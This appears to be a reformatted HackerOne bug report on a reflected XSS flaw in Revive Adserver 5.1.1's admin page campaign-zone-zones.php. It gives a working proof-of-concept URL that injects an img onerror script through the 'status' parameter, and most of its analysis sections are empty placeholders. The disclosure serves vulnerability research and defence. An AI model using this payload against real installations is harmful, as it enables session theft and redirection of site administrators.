# Reflected XSS on /admin/campaign-zone-zones.php

## Metadata
- **Source:** HackerOne
- **Report:** 1097979 | https://hackerone.com/reports/1097979
- **Submitted:** 2021-02-07
- **Reporter:** solov9ev
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Cross-site Scripting (XSS) - Reflected
- **CVEs:** CVE-2021-22888
- **Category:** web-api

## Summary
I found a reflected XSS attack on `/admin/campaign-zone-zones.php`.

Revive-Adserver version is `revive-adserver-5.1.1`.

- Go to `http://revive-adserver.loc/admin/campaign-zone-zones.php?_=&clientid=1&campaignid=1&status=available%22%3E%3Cimg%20src=1%20onerror=alert(document.domain)%3E&text=`

- Malicious code executed

{F1187355}

Rendered response from server:

{F1187356}

## Impact

With this 

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

I found a reflected XSS attack on `/admin/campaign-zone-zones.php`.

Revive-Adserver version is `revive-adserver-5.1.1`.

- Go to `http://revive-adserver.loc/admin/campaign-zone-zones.php?_=&clientid=1&campaignid=1&status=available%22%3E%3Cimg%20src=1%20onerror=alert(document.domain)%3E&text=`

- Malicious code executed

{F1187355}

Rendered response from server:

{F1187356}

## Impact

With this vulnerability, an attacker can for example steal users cookies or redirect users on malicious website.

</details>

---
*Analysed by Claude on 2026-05-24*
